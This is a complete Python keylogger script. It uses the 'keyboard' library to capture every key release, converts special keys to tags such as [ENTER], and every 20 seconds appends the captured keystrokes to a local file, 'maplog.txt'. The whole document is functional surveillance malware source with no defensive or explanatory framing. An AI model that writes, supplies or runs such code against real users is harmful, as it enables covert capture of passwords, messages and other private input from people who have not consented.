import keyboard
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.report_method = report_method
        self.log = ""
        

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        

    def report_to_file(self):
        # open the file in write mode (create it)
        stamp = datetime.now().strftime("%H:%M:%S")
        with open(f"{self.filename}.txt", "a") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+]{stamp} || Saved {self.filename}.txt")


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.filename = "maplog"
            self.report_to_file()
        self.log = ""
        timer = Timer(interval=20, function=self.report)
        timer.daemon = True
        timer.start()
        

    def start(self):
        print(f'Running!')
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=20, report_method="file")
    keylogger.start()